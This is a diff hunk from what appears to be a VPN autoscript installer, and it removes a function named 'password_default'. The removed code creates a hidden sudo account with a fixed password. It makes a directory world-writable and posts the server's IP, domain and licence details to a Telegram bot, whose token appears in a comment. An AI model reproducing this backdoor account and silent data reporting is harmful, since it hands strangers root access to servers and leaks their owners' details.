@@ -967,45 +967,6 @@ clear
     profile
     enable_services
 }
-function password_default() {
-domain=$(cat /etc/xray/domain)
-    MYIP=$(curl -sS ipv4.icanhazip.com)
-    userdel jame > /dev/null 2>&1
-    Username="kyt"
-    Password=kyt
-    mkdir -p /home/script/
-    chmod 777 /home/script/
-    useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
-    echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
-    usermod -aG sudo $Username > /dev/null 2>&1
-
-    #CHATID="5078959483"
-    #KEY="7249877268:AAH_OG5nvJRKjWzNwQb_OIG909RBP9uve2c"
-    TIME="10"
-    URL="https://api.telegram.org/bot$KEY/sendMessage"
-    USRSC=$(curl https://raw.githubusercontent.com/welwel11/izin/main/izin | grep $ipsaya | awk '{print $2}')
-    EXPSC=$(curl https://raw.githubusercontent.com/welwel11/izin/main/izin | grep $ipsaya | awk '{print $3}')
-    TIMES=`date -d "0 days" +"%d-%m-%Y" `
-    TIMEZONE=$(printf '%(%H:%M:%S)T')
-    TEXT="
-<code>────────────────────</code>
-<b>   AUTOSCRIPT PREMIUM  </b>
-<code>────────────────────</code>
-<code>User   : </code><code>$USRSC</code>
-<code>Domain : </code><code>$domain</code>
-<code>Date   : </code><code>$TIMES</code>
-<code>Time   : </code><code>$TIMEZONE</code>
-<code>Ip vps : </code><code>$MYIP</code>
-<code>Exp Sc : </code><code>$EXPSC</code>
-<code>────────────────────</code>
-<i>Automatic Notification from</i>
-<i>Devils Tunnel</i>
-"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ🐳","url":"https://t.me/SilaaVp"},{"text":"GRUP🐬","url":"https://t.me/SillaVpnGr"}]]}'
-   
-curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
-
-}
-
 instal
 echo ""
 history -c
